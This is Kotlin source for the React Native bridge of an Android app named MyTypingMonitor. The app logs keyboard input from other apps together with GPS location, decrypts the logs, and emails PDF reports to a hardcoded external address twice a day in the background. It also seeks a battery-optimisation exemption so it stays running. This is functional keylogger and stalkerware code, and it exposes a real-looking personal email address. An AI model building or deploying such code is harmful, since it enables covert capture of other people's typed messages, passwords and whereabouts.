package com.mytypingmonitor.bridge

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import com.facebook.react.bridge.*
import com.mytypingmonitor.WorkManagerInitializer
import com.mytypingmonitor.db.AppDatabase
import com.mytypingmonitor.pdf.PdfGenerator
import com.mytypingmonitor.crypto.CryptoHelper
import com.mytypingmonitor.analytics.AnalyticsEngine
import com.mytypingmonitor.notification.NotificationHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class TypingMonitorModule(reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext) {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val database = AppDatabase.getDatabase(reactContext)
    private val cryptoHelper = CryptoHelper(reactContext)
    private val analytics = AnalyticsEngine(database)
    private val pdfGenerator = PdfGenerator(reactContext, database, cryptoHelper)
    private val notificationHelper = NotificationHelper(reactContext)

    override fun getName(): String = "TypingMonitor"

    @ReactMethod
    fun getLogs(promise: Promise) {
        scope.launch {
            try {
                val logs = database.typingLogDao().getRecentLogs(1000)
                val logsArray = WritableNativeArray()
                
                for (log in logs) {
                    val logMap = WritableNativeMap()
                    logMap.putString("id", log.id.toString())
                    try {
                        logMap.putString("text", cryptoHelper.decrypt(log.text))
                    } catch (e: Exception) {
                        logMap.putString("text", "[Encrypted]")
                    }
                    logMap.putString("appPackage", log.appPackage)
                    logMap.putDouble("timestamp", log.timestamp.toDouble())
                    if (log.latitude != null) {
                        logMap.putDouble("latitude", log.latitude)
                    }
                    if (log.longitude != null) {
                        logMap.putDouble("longitude", log.longitude)
                    }
                    logMap.putBoolean("isSent", log.isSent)
                    logsArray.pushMap(logMap)
                }
                
                promise.resolve(logsArray)
            } catch (e: Exception) {
                promise.reject("ERROR", e.message, e)
            }
        }
    }

    @ReactMethod
    fun getStats(promise: Promise) {
        scope.launch {
            try {
                val stats = analytics.computeStats()
                val statsMap = WritableNativeMap()
                statsMap.putDouble("totalChars", stats.totalChars.toDouble())
                statsMap.putInt("totalLogs", stats.totalLogs)
                statsMap.putInt("charsPerMinute", stats.charsPerMinute)
                statsMap.putString("mostUsedApp", stats.mostUsedApp)
                statsMap.putInt("mostUsedAppCount", stats.mostUsedAppCount)
                statsMap.putInt("uniqueLocations", stats.uniqueLocations)
                
                val hoursMap = WritableNativeMap()
                stats.activeHours.forEach { (hour, count) ->
                    hoursMap.putInt(hour.toString(), count)
                }
                statsMap.putMap("activeHours", hoursMap)
                
                promise.resolve(statsMap)
            } catch (e: Exception) {
                promise.reject("ERROR", e.message, e)
            }
        }
    }

    @ReactMethod
    fun sendLogs(promise: Promise) {
        scope.launch {
            try {
                val pdfFile = pdfGenerator.generateReport()
                val subject = "MyTypingMonitor - Typing Logs Report"
                val body = """
                    Typing Logs Report

                    Report generated at: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}

                    Please find the encrypted PDF report attached.
                """.trimIndent()

                val emailSent = com.mytypingmonitor.email.EmailSender.sendEmailWithAttachment(
                    subject = subject,
                    body = body,
                    attachmentPath = pdfFile.absolutePath
                )

                if (emailSent) {
                    val unsentLogs = database.typingLogDao().getRecentLogs(10000).filter { !it.isSent }
                    if (unsentLogs.isNotEmpty()) {
                        database.typingLogDao().markAsSent(unsentLogs.map { it.id })
                    }
                    promise.resolve("Email sent successfully.")
                } else {
                    notificationHelper.showLogsReadyNotification(pdfFile.absolutePath)
                    promise.reject("EMAIL_ERROR", "Email failed. A local report notification was created if notifications are allowed.")
                }
            } catch (e: Exception) {
                promise.reject("ERROR", e.message, e)
            }
        }
    }

    @ReactMethod
    fun openKeyboardSettings() {
        val intent = Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        reactApplicationContext.startActivity(intent)
    }

    @ReactMethod
    fun openBatteryOptimizationSettings() {
        val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${reactApplicationContext.packageName}")
            }
        } else {
            Intent(Settings.ACTION_SETTINGS)
        }
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        reactApplicationContext.startActivity(intent)
    }

    @ReactMethod
    fun scheduleBackgroundEmail(promise: Promise) {
        try {
            WorkManagerInitializer.scheduleEmailTasks(reactApplicationContext)
            promise.resolve("Background email checks scheduled for 12:00 PM and 12:00 AM.")
        } catch (e: Exception) {
            promise.reject("SCHEDULE_ERROR", e.message, e)
        }
    }

    @ReactMethod
    fun clearLogs(promise: Promise) {
        scope.launch {
            try {
                val oldTimestamp = System.currentTimeMillis() - (30 * 24 * 60 * 60 * 1000L) // 30 days ago
                database.typingLogDao().deleteOldSentLogs(oldTimestamp)
                promise.resolve(true)
            } catch (e: Exception) {
                promise.reject("ERROR", e.message, e)
            }
        }
    }

    @ReactMethod
    fun testSendEmail(promise: Promise) {
        scope.launch {
            try {
                android.util.Log.d("TypingMonitor", "Testing email send...")
                
                // Generate test PDF
                val pdfFile = pdfGenerator.generateReport()
                android.util.Log.d("TypingMonitor", "PDF generated: ${pdfFile.absolutePath}")
                
                // Send test email
                val subject = "MyTypingMonitor - Test Email"
                val body = """
                    This is a test email from MyTypingMonitor.
                    
                    PDF report is attached.
                    Generated at: ${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}
                """.trimIndent()
                
                android.util.Log.d("TypingMonitor", "Sending email...")
                val emailSent = com.mytypingmonitor.email.EmailSender.sendEmailWithAttachment(
                    subject = subject,
                    body = body,
                    attachmentPath = pdfFile.absolutePath
                )
                
                if (emailSent) {
                    android.util.Log.d("TypingMonitor", "Email sent successfully!")
                    promise.resolve("Email sent successfully! Check ffgallibot@dswd.gov.ph")
                } else {
                    android.util.Log.e("TypingMonitor", "Email sending failed")
                    promise.reject("EMAIL_ERROR", "Failed to send email. Check logs for details.")
                }
            } catch (e: Exception) {
                android.util.Log.e("TypingMonitor", "Error in testSendEmail: ${e.message}", e)
                promise.reject("ERROR", "Error: ${e.message}", e)
            }
        }
    }

    @ReactMethod
    fun triggerEmailWorker(promise: Promise) {
        scope.launch {
            try {
                android.util.Log.d("TypingMonitor", "Manually triggering email worker...")
                
                // Create a one-time work request
                val constraints = androidx.work.Constraints.Builder()
                    .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                    .setRequiresBatteryNotLow(false) // Allow even if battery is low for testing
                    .build()
                
                val workRequest = androidx.work.OneTimeWorkRequestBuilder<com.mytypingmonitor.worker.EmailTriggerWorker>()
                    .setConstraints(constraints)
                    .addTag("manual_trigger")
                    .setInputData(androidx.work.Data.Builder().putString("tag", "manual_trigger").build())
                    .build()
                
                androidx.work.WorkManager.getInstance(reactApplicationContext)
                    .enqueue(workRequest)
                
                promise.resolve("Email worker triggered. Check logs and email inbox.")
            } catch (e: Exception) {
                android.util.Log.e("TypingMonitor", "Error triggering worker: ${e.message}", e)
                promise.reject("ERROR", "Error: ${e.message}", e)
            }
        }
    }
}
